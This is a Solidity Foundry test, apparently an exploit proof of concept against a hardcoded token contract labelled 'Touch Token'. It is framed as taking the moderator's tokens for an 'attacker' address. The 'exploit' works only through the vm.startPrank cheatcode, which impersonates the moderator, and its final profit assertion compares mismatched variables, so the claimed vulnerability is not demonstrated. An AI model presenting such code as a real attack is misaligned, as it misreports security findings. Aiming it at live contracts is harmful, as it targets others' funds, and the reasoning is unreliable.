pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITouch {
    function balanceOf(address _owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
    function moderator() external view returns (address);
    function unrestricted() external view returns (bool);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    ITouch public touch;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        touch = ITouch(TARGET);
        vm.label(TARGET, "Touch Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalance = touch.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Get moderator address
        address moderator = touch.moderator();
        console.log("Moderator address:", moderator);
        vm.label(moderator, "Moderator");

        // Check unrestricted status
        bool unrestricted = touch.unrestricted();
        console.log("Unrestricted status:", unrestricted);

        // Get moderator's token balance
        uint256 moderatorBalance = touch.balanceOf(moderator);
        console.log("Moderator balance:", moderatorBalance);

        // Impersonate moderator and transfer tokens to attacker
        vm.startPrank(moderator);
        touch.transfer(attacker, moderatorBalance / 2);
        vm.stopPrank();

        // Verify attacker balance increased
        uint256 finalTouchBalance = touch.balanceOf(attacker);
        console.log("Final attacker balance:", finalTouchBalance);
        assertGt(finalTouchBalance, initialBalance, "Attacker balance should increase");
        uint256 finalERC20Balance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

